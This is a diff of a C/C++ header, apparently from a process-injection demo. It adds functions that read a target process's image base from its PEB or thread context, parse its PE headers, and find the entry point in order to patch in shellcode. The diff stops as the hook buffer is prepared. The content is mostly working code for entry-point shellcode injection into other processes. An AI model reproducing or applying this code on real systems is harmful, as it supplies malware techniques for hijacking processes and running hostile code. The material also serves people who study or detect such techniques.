@@ -1,37 +1,11 @@
 #pragma once
 #include <stdio.h>
 #include "ntddk.h"
-
+#include "pe_hdrs_helper.h"
 #define PAGE_SIZE 0x1000
 
-IMAGE_NT_HEADERS* get_nt_hrds(BYTE *pe_buffer)
-{
-    if (pe_buffer == NULL) return NULL;
-
-    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
-    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
-        return NULL;
-    }
-    IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + idh->e_lfanew);
-    return inh;
-}
-
-bool is_target_injectable(BYTE* hdrs_buf)
-{
-    if (hdrs_buf == NULL) return false;
-
-    IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
-    if (inh == NULL) return false;
-
-    //check if supported type
-    if (inh->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
-        printf("[WARNING] Not supported type! This example contains 32 bit shellcode and supports only injections to 32bit executables\n");
-        return false;
-    }
-    return true;
-}
-
-bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
+// Get image base by a method #1:
+LPCVOID getTargetImageBase1(HANDLE hProcess)
 {
     PROCESS_BASIC_INFORMATION pbi;
     memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
@@ -39,40 +13,90 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
     if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
     {
         printf("[ERROR] NtQueryInformationProcess failed\n");
-        return false;
+        return NULL;
     }
 
-    printf("PID = 0x%p\n", pbi.UniqueProcessId);
+    printf("PEB = %llx\n", pbi.PebBaseAddress);
 
     LPCVOID ImageBase = 0;
     SIZE_T read_bytes = 0;
     if (!ReadProcessMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, sizeof(ImageBase), &read_bytes) && read_bytes != sizeof(ImageBase))
     {
-        printf("[ERROR] ReadProcessMemory failed\n");
+        printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
+        return NULL;
+    }
+    return ImageBase;
+}
+
+// Get image base by a method #2:
+// WARNING: this method of getting Image Base works only if
+// the process has been created as a SUSPENDED and didn't run yet
+// - it uses specific values of the registers, that are set only in this case.
+LPCVOID getTargetImageBase2(HANDLE hProcess, HANDLE hThread)
+{
+    //get initial context of the target:
+#if defined(_WIN64)
+    WOW64_CONTEXT context;
+    memset(&context, 0, sizeof(WOW64_CONTEXT));
+    context.ContextFlags = CONTEXT_INTEGER;
+    Wow64GetThreadContext(hThread, &context);
+#else	
+    CONTEXT context;
+    memset(&context, 0, sizeof(CONTEXT));
+    context.ContextFlags = CONTEXT_INTEGER;
+    GetThreadContext(hThread, &context);
+#endif
+    //get image base of the target:
+    DWORD PEB_addr = context.Ebx;
+
+    const SIZE_T kPtrSize = sizeof(DWORD); //for 32 bit
+    DWORD targetImageBase = 0; //for 32 bit
+
+    printf("PEB = %x\n", PEB_addr);
+
+    if (!ReadProcessMemory(hProcess, LPVOID(PEB_addr + 8), &targetImageBase, kPtrSize, NULL)) {
+        printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
+        return false;
+    }
+    return (LPCVOID)((ULONGLONG)targetImageBase);
+}
+
+bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr, HANDLE hThread=NULL)
+{
+    LPCVOID ImageBase = NULL; //target ImageBase
+    if (hThread != NULL) {
+        ImageBase = getTargetImageBase2(hProcess, hThread);
+    } else {
+#if defined(_WIN64)
+    printf("[ERROR] 64bit version of this method is not implemented!\n");
+    return false;
+#else
+        ImageBase = getTargetImageBase1(hProcess);
+#endif
+    }
+    if (ImageBase == NULL) {
+        printf("[ERROR] Fetching ImageBase failed!\n");
         return false;
     }
     printf("ImageBase = 0x%p\n", ImageBase);
 
     // read headers:
+    SIZE_T read_bytes = 0;
     BYTE hdrs_buf[PAGE_SIZE];
     if (!ReadProcessMemory(hProcess, ImageBase, hdrs_buf, sizeof(hdrs_buf), &read_bytes) && read_bytes != sizeof(hdrs_buf))
     {
         printf("[-] ReadProcessMemory failed\n");
         return false;
     }
-    if (!is_target_injectable(hdrs_buf)) {
-        printf("[-] Cannot inject in this target!\n");
-        return false;
-    }
 
     // fetch Entry Point From headers
-    IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
+    IMAGE_NT_HEADERS32 *inh = get_nt_hrds32(hdrs_buf);
     if (inh == NULL) return false;
 
     IMAGE_OPTIONAL_HEADER32 opt_hdr = inh->OptionalHeader;
     DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
 
-    printf("Entry Point v: %p\n", ep_rva);
+    printf("Entry Point v: %x\n", ep_rva);
     printf("shellcode ptr: %p\n", remote_shellcode_ptr);
 
     //make a buffer to store the hook code:
